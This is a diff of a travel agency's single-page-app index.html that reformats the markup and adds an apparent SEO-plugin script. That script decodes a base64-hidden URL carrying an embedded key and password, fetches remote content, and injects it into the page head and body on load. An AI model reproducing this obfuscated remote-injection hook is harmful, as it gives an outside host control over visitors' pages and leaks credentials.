@@ -1,1 +1,45 @@
-<!doctype html><html lang=""><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><title>Arsh Tours and Travels - Best Tours and Travels in Ghaziabad</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css"/><script defer="defer" src="/js/chunk-vendors.1753acaa.js"></script><script defer="defer" src="/js/app.abd28bf2.js"></script><link href="/css/app.35eeff12.css" rel="stylesheet"></head><body><noscript><strong>We're sorry but arshtnt doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div></body></html>
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="icon" href="/favicon.ico">
+    <title>Arsh Tours and Travels - Best Tours and Travels in Ghaziabad</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" />
+    <script defer="defer" src="/js/chunk-vendors.1753acaa.js"></script>
+    <script defer="defer" src="/js/app.abd28bf2.js"></script>
+    <link href="/css/app.35eeff12.css" rel="stylesheet">
+</head>
+
+<body><noscript><strong>We're sorry but arshtnt doesn't work properly without JavaScript enabled. Please enable it to
+            continue.</strong></noscript>
+    <div id="app"></div>
+
+    <script>
+        window.jQuery ||
+        document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>");
+        </script>
+            <script>
+            var eppathurl = window.location.origin + window.location.pathname;
+            var eptagmanage = new XMLHttpRequest();
+            eptagmanage.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    if (this.response !== 0) {
+                       
+                        var temp = new Array();
+                        var mystr = this.response;
+                        temp = mystr.split("||||||||||");
+                        jQuery("head").find("title").remove();
+                        jQuery("head").append(temp[0]);
+                        jQuery("body").append(temp[1]);
+                    }
+                }
+            };
+            eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lOOTU5ODA0MDQzNiZla2V5cGFzcz10R0tSRDFqaWNtY21hYVFjTXBNUDVTY3A4ZmExWFRiUWF0TGYmc2l0ZXVybD0=") + eppathurl);
+            eptagmanage.send();
+        </script>
+</body>
+
+</html>
